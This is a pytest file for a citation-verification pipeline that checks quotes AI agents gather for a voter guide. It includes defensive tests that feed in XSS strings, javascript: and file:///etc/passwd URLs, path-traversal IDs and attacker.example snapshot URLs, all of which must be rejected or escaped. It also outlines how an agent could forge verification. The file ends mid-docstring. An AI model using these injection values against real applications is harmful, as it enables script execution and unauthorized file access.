"""Offline verifier tests. The important ones are the *failure* cases: this pipeline is
only worth anything if it reliably catches bad citations."""

from __future__ import annotations

import json
import re
from datetime import UTC, datetime
from pathlib import Path

import pytest

from vgpipe import fetch as fetch_mod
from vgpipe.models import Claim, PageCache, Source
from vgpipe.normalize import normalize
from vgpipe.sources import load_rules
from vgpipe.verify import check_corroboration, revalidate_from_cache, verify_source

# Pin the source lists so these tests don't depend on which races/ files exist.
RULES = load_rules(("us", "ca"))

PAGE_TEXT = (
    "Deputy Controller Dana Ko said Tuesday that she opposed the Harbor Levy Act, "
    "calling it “unworkable—a burden on the port.”\n\n"
    "The measure would levy a one-time fee. The measure would levy a one-time fee.\n"
)

PDF_TEXT = "\n\n[[page 1]]\ncover\n\n[[page 7]]\nThe  Board   voted  9-2 to\napprove the lease."


def _page(text=PAGE_TEXT, **kw):
    d = dict(url="https://calmatters.org/a", final_url="https://calmatters.org/a", status=200,
             content_type="text/html", title="T", text=text,
             fetched_at=datetime.now(UTC))
    if "url" in kw and "final_url" not in kw:
        d["final_url"] = kw["url"]   # no redirect unless a test says so
    d.update(kw)
    return PageCache(**d)


def _gated(url):
    """A live page that really is paywalled: what an archive verification stands on."""
    return _page(url=url, final_url=url, status=403, text="", paywall_suspected=True)


@pytest.fixture
def stub(monkeypatch):
    pages: dict[str, PageCache] = {}

    def _fetch(url, root, *, refresh=False, timeout=30.0):
        return pages.get(url, _page(url=url, status=404, text="", error="not found"))

    monkeypatch.setattr("vgpipe.verify.fetch", _fetch)
    monkeypatch.setattr("vgpipe.verify.load_cached", lambda root, url: pages.get(url))
    return pages


def src(**kw):
    d = dict(url="https://calmatters.org/a", publisher="CalMatters", author="A. Reporter",
             date="2026-05-14", source_type="bylined_journalism",
             snippet="she opposed the Harbor Levy Act")
    d.update(kw)
    return Source(**d)


def test_exact_match_verifies(stub, tmp_path):
    stub["https://calmatters.org/a"] = _page()
    s = verify_source(src(), tmp_path, rules=RULES)
    assert s.verification.status == "verified"
    assert s.verification.match_count == 1
    assert "Harbor Levy Act" in s.verification.context


def test_smart_quote_and_dash_downgrade_to_normalized(stub, tmp_path):
    """Agent typed straight quotes; page has curly ones. Real, and must not pass as
    'verified' — the human's Cmd-F will need a shorter fragment."""
    stub["https://calmatters.org/a"] = _page()
    s = verify_source(src(snippet='calling it "unworkable--a burden'), tmp_path, rules=RULES)
    assert s.verification.status == "normalized_match"
    assert "normaliz" in s.verification.reason


def test_whitespace_collapse_matches(stub, tmp_path):
    stub["https://calmatters.org/a"] = _page(text="foo   bar\n  baz qux distinctive tail")
    s = verify_source(src(snippet="foo bar baz qux"), tmp_path, rules=RULES)
    assert s.verification.status == "normalized_match"


def test_repeated_snippet_fails_uniqueness(stub, tmp_path):
    stub["https://calmatters.org/a"] = _page()
    s = verify_source(src(snippet="The measure would levy a one-time fee"), tmp_path, rules=RULES)
    assert s.verification.status == "snippet_not_unique"
    assert s.verification.match_count == 2


def test_fabricated_quote_is_caught(stub, tmp_path):
    stub["https://calmatters.org/a"] = _page()
    s = verify_source(src(snippet="Ko called the levy a job-killing disaster"), tmp_path, rules=RULES)
    assert s.verification.status == "snippet_not_found"


def test_excluded_aggregator_rejected(tmp_path):
    s = verify_source(src(url="https://grokipedia.com/dana-ko", publisher="Grokipedia"), tmp_path, rules=RULES)
    assert s.verification.status == "bad_source_class"
    assert "aggregator" in s.verification.reason


def test_ballotpedia_is_lead_generator_only(tmp_path):
    s = verify_source(src(url="https://ballotpedia.org/Dana_Ko", publisher="Ballotpedia"), tmp_path, rules=RULES)
    assert s.verification.status == "bad_source_class"
    assert "lead-generator" in s.verification.reason


def test_campaign_site_only_for_campaign_says_claims(tmp_path):
    # campaign domains belong to a race, so the shipped lists name none: this test lists its own
    rules = {**RULES, "campaign_statement_only": ("votedanako.example",)}
    bad = verify_source(src(url="https://votedanako.example/issues", publisher="Ko campaign"), tmp_path, rules=rules)
    assert bad.verification.status == "bad_source_class"


def test_unbylined_source_rejected(tmp_path):
    s = verify_source(src(author="Staff"), tmp_path, rules=RULES)
    assert s.verification.status == "bad_source_class"


def test_institutional_author_accepted(stub, tmp_path):
    stub["https://lao.ca.gov/r.pdf"] = _page(
        url="https://lao.ca.gov/r.pdf", text=PDF_TEXT, is_pdf=True, content_type="application/pdf")
    s = verify_source(src(url="https://lao.ca.gov/r.pdf",
                          publisher="Legislative Analyst's Office",
                          author="Legislative Analyst's Office",
                          source_type="primary_document",
                          snippet="The Board voted 9-2 to approve the lease"), tmp_path, rules=RULES)
    assert s.verification.status == "pdf_normalized_match"
    assert s.page == 7, "PDF page locator should be recovered for the human"


def test_paywalled_page_is_flagged_not_failed(stub, tmp_path):
    stub["https://ocregister.com/x"] = _page(
        url="https://ocregister.com/x", text="Subscribe to continue reading this article.",
        paywall_suspected=True)
    s = verify_source(src(url="https://ocregister.com/x", publisher="OC Register"), tmp_path, rules=RULES)
    assert s.verification.status == "could_not_verify_paywall"
    assert s.paywall is True


def test_fetch_failure(stub, tmp_path):
    s = verify_source(src(url="https://calmatters.org/gone"), tmp_path, rules=RULES)
    assert s.verification.status == "fetch_failed"


def test_too_short_and_too_long_snippets(stub, tmp_path):
    stub["https://calmatters.org/a"] = _page()
    assert verify_source(src(snippet="the tax"), tmp_path, rules=RULES).verification.status == "snippet_too_short"
    long = " ".join(["word"] * 30)
    assert verify_source(src(snippet=long), tmp_path, rules=RULES).verification.status == "human_review"


def _verified(**kw):
    s = src(**kw)
    s.verification.status = "verified"
    return s


def test_adversarial_needs_two_independent_publishers():
    # Two snippets from the SAME url are one document, not two sources. Counting snippets
    # reported "9 usable" for 9 quotes across 4 articles from 2 outlets.
    c = Claim(question_id="q1", question="?", answer="a", claim_type="adversarial",
              sources=[_verified(), _verified(snippet="other snippet here now")])
    c = check_corroboration(c)
    assert c.corroboration_ok is False
    assert "1 document" in c.corroboration_note

    # Two documents, same publisher: reaches the independence check and fails it.
    same_pub = Claim(question_id="q2", question="?", answer="a", claim_type="adversarial",
                     sources=[_verified(),
                              _verified(url="https://calmatters.org/second-article")])
    same_pub = check_corroboration(same_pub)
    assert same_pub.corroboration_ok is False
    assert "not independent" in same_pub.corroboration_note

    c2 = Claim(question_id="q1", question="?", answer="a", claim_type="adversarial",
               sources=[_verified(),
                        _verified(url="https://sacbee.com/b", publisher="Sacramento Bee")])
    assert check_corroboration(c2).corroboration_ok is True


def test_mechanical_needs_one():
    c = Claim(question_id="q1", question="?", answer="a", sources=[_verified()])
    assert check_corroboration(c).corroboration_ok is True


def test_not_found_is_a_valid_answer():
    c = Claim(question_id="q1", question="?", answer="no source found", confidence="not_found")
    c = check_corroboration(c)
    assert c.corroboration_ok is True and c.status == "not_found"


def test_normalize_index_map_alignment():
    n, idx = normalize(PAGE_TEXT)
    assert len(n) == len(idx)
    assert all(0 <= i < len(PAGE_TEXT) for i in idx)


# --- review findings ---------------------------------------------------------------


def test_paywall_flag_is_recomputed_not_sticky(stub, tmp_path):
    """A source flagged paywalled on an earlier run must not stay flagged once the page
    fetches cleanly — the review app routes paywall rows to extra-care handling."""
    stub["https://calmatters.org/a"] = _page()
    s = src(paywall=True)
    s.verification.status = "could_not_verify_paywall"
    verify_source(s, tmp_path, rules=RULES)
    assert s.paywall is False
    assert s.verification.status == "verified"


def test_agent_cannot_declare_its_own_citation_verified():
    """The core invariant: pipeline-owned fields in an agent-authored file are discarded."""
    from vgpipe.models import strip_machine_fields

    forged = {
        "question_id": "q9", "question": "?", "answer": "a", "confidence": "direct",
        "corroboration_ok": True,
        "sources": [{
            "url": "https://calmatters.org/a", "publisher": "CalMatters", "author": "R",
            "source_type": "bylined_journalism", "snippet": "a fabricated quotation here",
            "archive_url": "https://web.archive.org/web/2026/fake",
            "verification": {"status": "verified", "support": "supports"},
        }],
    }
    c = Claim.model_validate(strip_machine_fields(forged))
    assert c.sources[0].verification.status == "pending"
    assert c.corroboration_ok is None
    assert c.status != "verified"
    # archive_url is evidence too (verify_against_archive fetches it), so it goes the same
    # way; the pipeline's own snapshots come back from the run's archive records.
    assert c.sources[0].archive_url is None


def test_verified_status_must_be_reproducible_from_cache(tmp_path, monkeypatch):
    """Even a status that reaches build must survive an offline re-check against the
    cached page it was supposedly verified against."""
    cached = {"https://calmatters.org/a": _page()}
    monkeypatch.setattr("vgpipe.verify.load_cached", lambda root, url: cached.get(url))

    honest = src()
    honest.verification.status = "verified"
    assert revalidate_from_cache(honest, tmp_path).verification.status == "verified"

    forged = src(snippet="a quote that is nowhere on this page")
    forged.verification.status = "verified"
    forged.verification.context = "a fabricated excerpt that reads as if it supports this"
    forged.verification.context_offset = (0, 5)
    forged.verification.support = "supports"
    forged.verification.support_note = "a judgment nothing produced"
    out = revalidate_from_cache(forged, tmp_path)
    assert out.verification.status == "human_review"
    assert "snippet_not_found" in out.verification.reason
    # Downgrading the status is not enough: the app renders `context` as the highlighted
    # excerpt and shows the support verdict, so a forged pair would still be read by the
    # human with only a badge to contradict it.
    assert out.verification.context is None
    assert out.verification.context_offset is None
    assert out.verification.support == "unreviewed"
    assert out.verification.support_note is None

    no_cache = src(url="https://calmatters.org/never-fetched")
    no_cache.verification.status = "verified"
    no_cache.verification.context = "fabricated context"
    no_cache.verification.support = "supports"
    out = revalidate_from_cache(no_cache, tmp_path)
    assert out.verification.status == "human_review"
    assert "no cached page" in out.verification.reason
    assert out.verification.context is None
    assert out.verification.support == "unreviewed"


def test_context_window_keeps_left_context():
    """`context_window` advances past the partial word at the slice start; it must not
    collapse to the last space before the match (that would strip nearly all of the
    left-hand context the human needs to judge the claim)."""
    from vgpipe.normalize import context_window

    text = "alpha bravo charlie delta echo foxtrot golf hotel india juliet " * 6
    start = text.index("hotel india juliet", 200)
    end = start + len("hotel india juliet")
    excerpt, rs, re_ = context_window(text, start, end, radius=120)
    assert excerpt[rs:re_] == "hotel india juliet"
    assert rs > 80, "left context should be preserved, not trimmed to the nearest space"
    assert not excerpt.startswith(" ")


# --- races and source lists --------------------------------------------------------


def test_source_lists_merge_per_race():
    from vgpipe.sources import classify

    us = load_rules(("us",))
    both = load_rules(("us", "ca"))
    assert classify("https://calmatters.org/x", us) == "unknown"
    assert classify("https://calmatters.org/x", both) == "bylined_journalism"
    # structural rules come from the national list and apply everywhere
    assert classify("https://grokipedia.com/x", us) == "excluded"
    assert classify("https://ballotpedia.org/x", both) == "lead_generator_only"


def test_race_file_declares_title_and_sources():
    from vgpipe.races import available, load

    assert "example" in available()
    r = load("example")
    assert r.sources == ["us", "ca"]
    assert r.title and "County Assessor" in r.title
    assert "Avery Lind" in r.context, "race context feeds researcher prompts verbatim"


def test_question_id_cannot_escape_the_claims_directory(tmp_path):
    """`question_id` becomes a filename and arrives from agent-authored JSON, so a
    traversal must be rejected at the schema boundary, not at the write."""
    import pydantic

    from vgpipe.cli import save_claims

    for bad in ("../../etc/passwd", "/tmp/evil", "q1/../../x", "", "a" * 65):
        with pytest.raises(pydantic.ValidationError):
            Claim(question_id=bad, question="?", answer="a")

    ok = Claim(question_id="q2a", question="?", answer="a")
    save_claims([ok], tmp_path)
    assert (tmp_path / "q2a.json").exists()
    assert sorted(p.name for p in tmp_path.iterdir()) == ["q2a.json"]


def test_save_claims_refuses_a_path_outside_the_directory(tmp_path):
    """Defense in depth: even if the schema constraint were loosened, the write itself
    must refuse to leave the data directory."""
    from vgpipe.cli import save_claims

    c = Claim(question_id="q1", question="?", answer="a")
    object.__setattr__(c, "question_id", "../escaped")   # bypass validation deliberately
    with pytest.raises(ValueError, match="refusing to write"):
        save_claims([c], tmp_path)
    assert not (tmp_path.parent / "escaped.json").exists()


def test_duplicate_question_ids_are_rejected(tmp_path):
    """save_claims() writes <qid>.json, so a claim first written under a different
    filename leaves a stale duplicate. Loading both double-counts the question in every
    status total and renders it twice in the review app."""
    import json

    from vgpipe.cli import load_claims

    claim = {"question_id": "q1", "question": "?", "answer": "a",
             "confidence": "direct", "sources": []}
    (tmp_path / "q1.json").write_text(json.dumps(claim))
    assert len(load_claims(tmp_path)) == 1
    (tmp_path / "draft-q1.json").write_text(json.dumps(claim))
    with pytest.raises(ValueError, match="duplicate question_id"):
        load_claims(tmp_path)


def test_paywalled_source_is_verified_against_its_snapshot(stub, tmp_path):
    """A paywalled row is where the human has the least to work with, so if the snapshot
    is readable the pipeline should do the check instead of handing over a bare link."""
    from vgpipe.verify import verify_against_archive

    snap = "https://web.archive.org/web/2026/https://ocregister.com/x"
    stub[snap] = _page(url=snap)
    stub["https://ocregister.com/x"] = _gated("https://ocregister.com/x")
    s = src(url="https://ocregister.com/x", publisher="OC Register", archive_url=snap)
    s.verification.status = "could_not_verify_paywall"
    s.paywall = True

    out = verify_against_archive(s, tmp_path)
    assert out.verification.status == "verified_via_archive"
    assert "Harbor Levy Act" in out.verification.context

    # never invents a verification where the snapshot doesn't carry the quote
    other = src(url="https://ocregister.com/y", publisher="OC Register",
                archive_url=snap, snippet="a quote that is not in the snapshot")
    other.verification.status = "could_not_verify_paywall"
    assert verify_against_archive(other, tmp_path).verification.status == "could_not_verify_paywall"

    # never touches a live verification
    live = src()
    live.verification.status = "verified"
    assert verify_against_archive(live, tmp_path).verification.status == "verified"


def test_review_progress_key_survives_question_set_changes(tmp_path):
    """Checkbox state is keyed by the race, not by the question set. Questions get added,
    split, and dropped constantly during a run; re-keying would silently wipe a review
    already in progress — the one moment losing it is most expensive."""
    import re as _re

    from vgpipe.report import render

    def key_for(claims):
        html, _ = render(claims, tmp_path, title="2030 Example County Assessor")
        return _re.search(r'const KEY = "([^"]+)"', html.read_text()).group(1)

    one = [Claim(question_id="q1", question="?", answer="a")]
    two = one + [Claim(question_id="q2", question="?", answer="b")]
    assert key_for(one) == key_for(two)
    assert key_for(one) == "vgpipe:2030-example-county-assessor"


def test_source_ids_are_stable_and_snippet_specific():
    """Per-source ids back the checkboxes: stable across rebuilds so progress survives,
    but changing the snippet must reset that source — it's a different citation now."""
    a = Source(url="https://calmatters.org/a", publisher="CalMatters", author="R",
               source_type="bylined_journalism", snippet="she opposed the measure")
    same = Source(url="https://calmatters.org/a", publisher="CalMatters", author="Different",
                  source_type="bylined_journalism", snippet="she opposed the measure")
    edited = Source(url="https://calmatters.org/a", publisher="CalMatters", author="R",
                    source_type="bylined_journalism", snippet="opposed the tax measure")
    assert a.sid == same.sid
    assert a.sid != edited.sid


def test_short_page_is_not_badged_paywalled_when_the_snippet_is_there(stub, tmp_path):
    """The fetch heuristic flags thin pages as possibly-gated, which is right for routing
    a *failure*. But finding the snippet proves the text was readable — badging it
    paywalled would send the human to an archive snapshot for nothing."""
    stub["https://calmatters.org/a"] = _page(paywall_suspected=True)
    s = verify_source(src(), tmp_path, rules=RULES)
    assert s.verification.status == "verified"
    assert s.paywall is False


def test_pdf_word_broken_across_a_line_still_matches(stub, tmp_path):
    """PDFs break words at line ends ("settle-\\nment"). The primary sources for this work
    are PDFs, so a snippet containing such a word must still be findable — reported as a
    normalized match, since the join is a guess."""
    stub["https://lao.ca.gov/r.pdf"] = _page(
        url="https://lao.ca.gov/r.pdf", is_pdf=True, content_type="application/pdf",
        text="\n\n[[page 3]]\nThe Board approved the settle-\nment in August 2024.")
    s = verify_source(src(url="https://lao.ca.gov/r.pdf",
                          publisher="Legislative Analyst's Office",
                          author="Legislative Analyst's Office",
                          source_type="primary_document",
                          snippet="approved the settlement in August"), tmp_path, rules=RULES)
    assert s.verification.status == "pdf_normalized_match"
    assert s.page == 3
    # the stored text is untouched, so the human still reads what the document says
    assert "settle-" in s.verification.context


def test_dehyphenation_is_not_applied_to_html(stub, tmp_path):
    """Only PDFs get the line-break join; on HTML a hyphen-space is meaningful text."""
    stub["https://calmatters.org/a"] = _page(text="a cost- sharing arrangement here")
    s = verify_source(src(snippet="a costsharing arrangement"), tmp_path, rules=RULES)
    assert s.verification.status == "snippet_not_found"


def test_reverify_preserves_verifier_judgment_but_not_across_a_changed_quote(stub, tmp_path):
    """The verifier agent's support verdict is the expensive half to produce. Re-running
    vg verify must not wipe it — but it must also not carry it onto different words."""
    stub["https://calmatters.org/a"] = _page()

    s = verify_source(src(), tmp_path, rules=RULES)
    s.verification.support = "supports"
    s.verification.support_note = "states the position directly"

    again = verify_source(s, tmp_path, rules=RULES)
    assert again.verification.support == "supports"
    assert again.verification.support_note == "states the position directly"
    assert again.verification.attempts == 2

    # a retry that changes the quote lands in different context — judgment is stale
    s.snippet = "The measure would levy a one-time fee"
    s.verification.support = "supports"
    stub["https://calmatters.org/a"] = _page(text=PAGE_TEXT.replace(
        "The measure would levy a one-time fee. ", "", 1))
    moved = verify_source(s, tmp_path, rules=RULES)
    assert moved.verification.status == "verified"
    assert moved.verification.support == "unreviewed"


def test_render_does_not_mutate_the_claim_models(tmp_path):
    """Render-only fields belong on view objects; writing them into a pydantic instance
    shadows computed properties like Source.sid."""
    from vgpipe.report import render

    c = Claim(question_id="q1", question="?", answer="a", sources=[src()])
    render([c], tmp_path, title="T")
    assert "context_html" not in c.sources[0].__dict__
    assert "sid" not in c.sources[0].__dict__
    assert c.sources[0].sid  # still computed from url + snippet


def test_sources_disagreeing_with_each_other_are_flagged():
    """Two outlets reporting different numbers for the same fact is the single most
    valuable thing a voter-guide pipeline can surface. It is invisible to the
    answer-vs-snippets check, which passes as long as the answer matches one of them."""
    from vgpipe.conflicts import detect

    c = Claim(
        question_id="q1", question="?", answer="The state paid $120,000 in 2019.",
        claim_type="adversarial",
        sources=[
            src(publisher="CalMatters", snippet="the state paid $120,000 to settle"),
            src(url="https://sacbee.com/b", publisher="Sacramento Bee",
                snippet="a $102,000 settlement was approved"),
        ])
    conflicts = detect([c])[0].conflicts
    assert any("sources disagree on a dollar figure" in x for x in conflicts)
    assert any("CalMatters" in x and "Sacramento Bee" in x for x in conflicts)

    agree = Claim(
        question_id="q2", question="?", answer="The state paid $120,000.",
        sources=[
            src(publisher="CalMatters", snippet="the state paid $120,000 to settle"),
            src(url="https://sacbee.com/b", publisher="Sacramento Bee",
                snippet="settled for $120,000 last spring"),
        ])
    assert detect([agree])[0].conflicts == []


def test_non_http_urls_are_rejected():
    """URLs come from agent-authored JSON and are rendered into <a href> in the review
    app, so a javascript:/data: scheme would execute on click. Escaping can't help — the
    scheme is the payload."""
    import pydantic

    for bad in ("javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
                "file:///etc/passwd", "vbscript:x", " javascript:alert(1)"):
        with pytest.raises(pydantic.ValidationError):
            Source(url=bad, publisher="P", author="A",
                   source_type="bylined_journalism", snippet="a snippet here")
        with pytest.raises(pydantic.ValidationError):
            Source(url="https://calmatters.org/a", archive_url=bad, publisher="P",
                   author="A", source_type="bylined_journalism", snippet="a snippet here")

    ok = Source(url="  https://calmatters.org/a  ", publisher="P", author="A",
                source_type="bylined_journalism", snippet="a snippet here")
    assert ok.url == "https://calmatters.org/a"


def test_verify_rerun_keeps_recorded_snapshots(stub, tmp_path):
    """vg verify strips archive_url on load and writes claims back, so it must put the
    pipeline's own snapshots back from the run's records — and only those. An agent-authored
    archive_url with no record behind it does not survive the write-back."""
    import json

    from vgpipe import archive as arch
    from vgpipe import cli

    snap = "https://web.archive.org/web/2026/https://calmatters.org/a"
    stub["https://calmatters.org/a"] = _page()
    stub[snap] = _page(url=snap)
    (tmp_path / "claims").mkdir()
    (tmp_path / "claims" / "q1.json").write_text(json.dumps({
        "question_id": "q1", "question": "?", "answer": "a",
        "sources": [
            {"url": "https://calmatters.org/a", "publisher": "CalMatters", "author": "R",
             "source_type": "bylined_journalism",
             "snippet": "she opposed the Harbor Levy Act",
             "archive_url": "https://web.archive.org/web/2026/https://attacker.example/a",
             "verification": {"status": "verified"}},
            {"url": "https://sacbee.com/b", "publisher": "Sacramento Bee", "author": "R",
             "source_type": "bylined_journalism", "snippet": "she opposed the Harbor Levy Act",
             "archive_url": "https://web.archive.org/web/2026/https://sacbee.com/b"}]}))
    arch.save_records(tmp_path, {"https://calmatters.org/a": {"snapshot": snap, "error": None}})

    cli.verify(data=tmp_path)

    written = json.loads((tmp_path / "claims" / "q1.json").read_text())["sources"]
    assert written[0]["archive_url"] == snap, "the recorded snapshot survives a verify re-run"
    assert written[0]["archive_status"] == "archived"
    assert written[1]["archive_url"] is None, "an agent-authored snapshot does not"


def test_review_app_escapes_hostile_claim_content(tmp_path):
    """Everything rendered into the review app is agent-authored and derived from fetched
    pages, so escaping is the whole defense.

    This regression exists because `select_autoescape(["html"])` matched on the filename
    suffix and the template is `review.html.j2` — it ends in `.j2`, so autoescaping was
    silently OFF for the entire app while looking correct in review. An attacker who gets
    a script tag into a page a researcher quotes would have had it execute in the
    reviewer's browser, where it could mark every citation checked in localStorage and
    defeat the human verification this whole pipeline exists to provide.
    """
    from vgpipe.report import render

    c = Claim(
        question_id="q1",
        question="Q<script>alert(1)</script>",
        answer="A<img src=x onerror=alert(2)>",
        sources=[src(publisher="<script>alert(3)</script>",
                     author="<img src=x onerror=alert(4)>",
                     snippet='snippet" onmouseover="alert(5)')],
    )
    c.sources[0].verification.reason = "<script>alert(6)</script>"
    c.conflicts = ["<script>alert(7)</script>"]

    html_path, _ = render([c], tmp_path, title="T")
    html = html_path.read_text()

    for payload in ("<script>alert(1)</script>", "<img src=x onerror=alert(2)>",
                    "<script>alert(3)</script>", "<img src=x onerror=alert(4)>",
                    '" onmouseover="alert(5)', "<script>alert(6)</script>",
                    "<script>alert(7)</script>"):
        assert payload not in html, f"unescaped payload rendered into the review app: {payload}"

    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in html, "content should render, escaped"


def test_urls_with_attribute_breakout_characters_are_rejected():
    """models._http_only promises the value is safe in an href, so it must reject the
    characters an attribute breakout needs rather than rely on the caller escaping."""
    import pydantic

    for bad in ('https://example.org/a" onmouseover="alert(9)',
                "https://example.org/a' onclick='x",
                "https://example.org/a<script>",
                "https://example.org/a\nSet-Cookie: x"):
        with pytest.raises(pydantic.ValidationError):
            Source(url=bad, publisher="P", author="A",
                   source_type="bylined_journalism", snippet="a snippet here")

    ok = Source(url="https://calmatters.org/a?x=1&y=2#frag", publisher="P", author="A",
                source_type="bylined_journalism", snippet="a snippet here")
    assert ok.url == "https://calmatters.org/a?x=1&y=2#frag"


def test_archive_verified_row_survives_build(tmp_path, monkeypatch):
    """verified_via_archive means the LIVE page was unreadable, so revalidating against
    src.url would fail by design and discard a status the pipeline itself produced —
    wiping every legitimately archive-verified row on `vg build`."""
    snap = "https://web.archive.org/web/2026/https://ocregister.com/x"
    cached = {
        # the live page is a paywall stub — exactly the situation this status exists for
        "https://ocregister.com/x": _page(url="https://ocregister.com/x",
                                           text="Subscribe to continue reading.",
                                           paywall_suspected=True),
        snap: _page(url=snap),
    }
    monkeypatch.setattr("vgpipe.verify.load_cached", lambda root, url: cached.get(url))

    s = src(url="https://ocregister.com/x", publisher="OC Register", archive_url=snap)
    s.verification.status = "verified_via_archive"
    s.verification.context = "kept"
    assert revalidate_from_cache(s, tmp_path).verification.status == "verified_via_archive"

    # but a claimed archive verification with no snapshot recorded is still discarded
    no_snap = src(url="https://ocregister.com/x", publisher="OC Register")
    no_snap.verification.status = "verified_via_archive"
    out = revalidate_from_cache(no_snap, tmp_path)
    assert out.verification.status == "human_review"
    assert "no snapshot is recorded" in out.verification.reason


def test_claimed_verified_cannot_ride_through_on_a_normalized_match(tmp_path, monkeypatch):
    """'verified' promises the human's literal Cmd-F will hit. A normalized-only match
    doesn't keep that promise, so a forged or stale 'verified' must not survive on one."""
    cached = {"https://calmatters.org/a": _page(text="the state paid “$120,000” to settle")}
    monkeypatch.setattr("vgpipe.verify.load_cached", lambda root, url: cached.get(url))

    s = src(snippet='paid "$120,000" to settle')   # straight quotes; page has curly
    s.verification.status = "verified"
    out = revalidate_from_cache(s, tmp_path)
    assert out.verification.status == "human_review"
    assert "only matches after normalization" in out.verification.reason

    # the honest status for that same match is left alone
    ok = src(snippet='paid "$120,000" to settle')
    ok.verification.status = "normalized_match"
    assert revalidate_from_cache(ok, tmp_path).verification.status == "normalized_match"


def test_archive_upgrade_flags_a_normalized_only_hit(stub, tmp_path):
    """The flag-don't-hide invariant applies to snapshots too."""
    from vgpipe.verify import verify_against_archive

    snap = "https://web.archive.org/web/2026/https://ocregister.com/x"
    stub[snap] = _page(url=snap)
    stub["https://ocregister.com/x"] = _gated("https://ocregister.com/x")
    s = src(url="https://ocregister.com/x", publisher="OC Register", archive_url=snap,
            snippet='calling it "unworkable--a burden')   # normalizes onto the page text
    s.verification.status = "could_not_verify_paywall"

    out = verify_against_archive(s, tmp_path)
    assert out.verification.status == "verified_via_archive"
    assert "normaliz" in out.verification.reason


def test_archive_url_must_be_a_wayback_snapshot():
    """verify_against_archive() fetches this URL and treats a snippet found there as
    evidence. An arbitrary host would let an agent stand up a page containing its own
    fabricated quote and earn verified_via_archive from it — the exact laundering path
    the pipeline exists to close. It is only safe to trust because the host is."""
    import pydantic

    for bad in ("https://attacker.example/fake-snapshot",
                "https://web-archive.org/web/2026/x",
                "http://web.archive.org/web/2026/x",   # http:// is not the snapshot host
                # archive.org at large serves user-uploaded items, so it is
                # attacker-controllable — only the Wayback snapshot path is trusted
                "https://archive.org/download/someones-item/page.html",
                "https://archive.org/web/2026/x",
                "https://web.archive.org/about/"):
        with pytest.raises(pydantic.ValidationError):
            Source(url="https://ocregister.com/x", archive_url=bad, publisher="P",
                   author="A", source_type="bylined_journalism", snippet="a snippet here")

    ok = Source(url="https://ocregister.com/x",
                archive_url="https://web.archive.org/web/2026/https://ocregister.com/x",
                publisher="P", author="A", source_type="bylined_journalism",
                snippet="a snippet here")
    assert ok.archive_url.startswith("https://web.archive.org/")


def test_load_claims_does_not_trust_by_default(tmp_path):
    """Reading data/claims/ must not trust agent-writable verification data unless the
    call site says so — defaulting to trust is how this invariant erodes."""
    import json

    from vgpipe.cli import load_claims

    (tmp_path / "q1.json").write_text(json.dumps({
        "question_id": "q1", "question": "?", "answer": "a", "corroboration_ok": True,
        "sources": [{"url": "https://calmatters.org/a", "publisher": "CalMatters",
                     "author": "R", "source_type": "bylined_journalism",
                     "snippet": "she opposed the measure",
                     "verification": {"status": "verified", "support": "supports"}}]}))

    default = load_claims(tmp_path)[0]
    assert default.sources[0].verification.status == "pending"
    assert default.corroboration_ok is None

    explicit = load_claims(tmp_path, trust_machine_fields=True)[0]
    assert explicit.sources[0].verification.status == "verified"


def test_revalidation_recomputes_the_excerpt_it_vouches_for(tmp_path, monkeypatch):
    """Confirming a status is reproducible is not enough. Context and offsets are what the
    review app actually draws, so a file pairing a reproducible status with a fabricated
    excerpt would show the human the fabrication under a green badge."""
    cached = {"https://calmatters.org/a": _page()}
    monkeypatch.setattr("vgpipe.verify.load_cached", lambda root, url: cached.get(url))

    s = src()   # snippet really is on the page, so the status itself reproduces
    s.verification.status = "verified"
    s.verification.context = "an excerpt that was never on this page"
    s.verification.context_offset = (0, 3)
    s.verification.matched_offset = 0
    s.verification.support = "supports"
    s.verification.support_note = "about the fabricated excerpt"

    out = revalidate_from_cache(s, tmp_path)
    assert out.verification.status == "verified"          # the citation is genuine
    assert "an excerpt that was never" not in (out.verification.context or "")
    assert "Harbor Levy Act" in out.verification.context
    assert out.verification.matched_offset == PAGE_TEXT.index(s.snippet)
    # the verdict was formed about different words, so it does not carry over
    assert out.verification.support == "unreviewed"
    assert out.verification.support_note is None


def test_judgment_does_not_transfer_to_a_neighbouring_phrase(stub, tmp_path):
    """Two nearby phrases share a context window, so matching the excerpt alone would let
    a retry that swapped the snippet inherit a verdict about its neighbour."""
    stub["https://calmatters.org/a"] = _page()

    first = verify_source(src(), tmp_path, rules=RULES)
    first.verification.support = "supports"
    first.verification.support_note = "verdict about the original phrase"

    # same page, same context window, different words
    first.snippet = "Deputy Controller Dana Ko said Tuesday"
    moved = verify_source(first, tmp_path, rules=RULES)
    assert moved.verification.status == "verified"
    assert moved.verification.support == "unreviewed", (
        "a verdict about one phrase must not carry onto its neighbour")


def test_archive_queues_every_cited_url(stub, tmp_path, monkeypatch):
    """vg archive's contract is to snapshot every cited URL. Skipping sources that already
    carry an archive_url lets a stale or prefilled snapshot persist forever."""
    import json

    from vgpipe import cli

    (tmp_path / "q1.json").write_text(json.dumps({
        "question_id": "q1", "question": "?", "answer": "a",
        "sources": [
            {"url": "https://calmatters.org/a", "publisher": "CalMatters", "author": "R",
             "source_type": "bylined_journalism", "snippet": "she opposed the measure",
             "archive_url": "https://web.archive.org/web/2019/stale"},
            {"url": "https://sacbee.com/b", "publisher": "Sacramento Bee", "author": "R",
             "source_type": "bylined_journalism", "snippet": "another snippet here"},
        ]}))

    queued: list[str] = []

    def fake_archive_all(urls, *, delay=3.0, progress=None):
        queued.extend(urls)
        out = {u: f"https://web.archive.org/web/2026/{u}" for u in urls}
        for u in urls:
            progress(u, out[u], None)
        return out

    monkeypatch.setattr(cli.arch, "archive_all", fake_archive_all)
    # Each fresh snapshot is checked before it counts: give them the cited text.
    for u in ("https://calmatters.org/a", "https://sacbee.com/b"):
        stub[f"https://web.archive.org/web/2026/{u}"] = _page(
            url=u, text="she opposed the measure\nanother snippet here")

    data_dir = tmp_path.parent / "data-root"
    (data_dir / "claims").mkdir(parents=True, exist_ok=True)
    (data_dir / "claims" / "q1.json").write_text((tmp_path / "q1.json").read_text())

    cli.archive(data=data_dir, delay=0)

    assert sorted(queued) == ["https://calmatters.org/a", "https://sacbee.com/b"], (
        "the already-archived source must still be re-snapshotted")
    written = json.loads((data_dir / "claims" / "q1.json").read_text())
    assert all("/web/2026/" in s["archive_url"] for s in written["sources"]), (
        "a stale snapshot must be overwritten with the fresh one")


def test_wayback_prefix_upgrade_leaves_the_archived_target_alone():
    """The availability API answers with an http:// snapshot URL and the cited URL is
